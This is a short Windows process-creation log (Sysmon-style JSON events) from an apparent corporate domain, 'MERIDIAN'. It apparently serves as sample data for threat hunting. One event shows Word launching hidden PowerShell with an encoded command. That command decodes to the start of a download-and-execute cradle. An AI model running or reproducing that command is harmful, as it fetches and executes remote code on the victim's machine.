{"EventID": 1, "UtcTime": "2026-03-02 08:14:21.114", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\inventory.ps1", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "MERIDIAN\\svc_inventory", "Computer": "MER-FS01.meridian.local"}
{"EventID": 1, "UtcTime": "2026-03-02 08:31:07.502", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir \\\\MER-FS01\\finance", "ParentImage": "C:\\Windows\\explorer.exe", "User": "MERIDIAN\\jdoe", "Computer": "MER-WK21.meridian.local"}
{"EventID": 1, "UtcTime": "2026-03-02 09:02:55.880", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -Command Get-Service -Name Spooler", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "MERIDIAN\\jdoe", "Computer": "MER-WK21.meridian.local"}
{"EventID": 1, "UtcTime": "2026-03-02 09:17:43.221", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "\"OUTLOOK.EXE\" /recycle", "ParentImage": "C:\\Windows\\explorer.exe", "User": "MERIDIAN\\jdoe", "Computer": "MER-WK21.meridian.local"}
{"EventID": 1, "UtcTime": "2026-03-02 09:41:18.640", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "MERIDIAN\\jdoe", "Computer": "MER-WK21.meridian.local"}
{"EventID": 1, "UtcTime": "2026-03-02 10:05:12.009", "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k netsvcs -p", "ParentImage": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM", "Computer": "MER-WK21.meridian.local"}
